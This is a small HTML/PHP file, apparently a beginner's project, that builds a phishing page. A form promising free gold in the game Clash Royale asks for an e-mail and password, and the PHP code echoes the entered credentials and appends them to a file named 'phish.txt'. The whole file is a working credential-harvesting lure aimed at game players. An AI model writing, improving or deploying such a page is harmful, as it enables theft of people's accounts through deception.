<!DOCTYPE html>
<html lang="no">
<head>
  <title> kul php </title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta charset="utf-8">
  <link rel="stylesheet" href="styling.css">
</head>
<body>
<h2>Login for gratis gull i Clash Royale</h2>
<form action="index.php" method="post">
    <input type="text" name="E-mail" placeholder="E-mail" id="input"> <br>
    <input type="password" name="password" placeholder="password" id="input"> <br>
    <input type="submit" name="login" value="Log in" id="skibidi"> <br>
</form>
</body>
</html>
<?php
if (isset($_POST["login"])) {
    $username = $_POST["E-mail"];
    $password = $_POST["password"];

    if (empty($username)) {
        echo "E-mail is not filled in";
    } elseif (empty($password)) {
        echo "Password is not filled in";
    } else {
        echo "E-mail = $username <br>";
        echo "Password = $password <br>";
    }
}

($myfile = fopen("phish.txt", "a")) or die("Unable to open file!");
fwrite($myfile, "E-mail: $username \n");
fwrite($myfile, "Password: $password \n");
fclose($myfile);

/*foreach ($_POST as $key => $value) {
        echo "$key = $val"ue <br>";
        }*/


?>
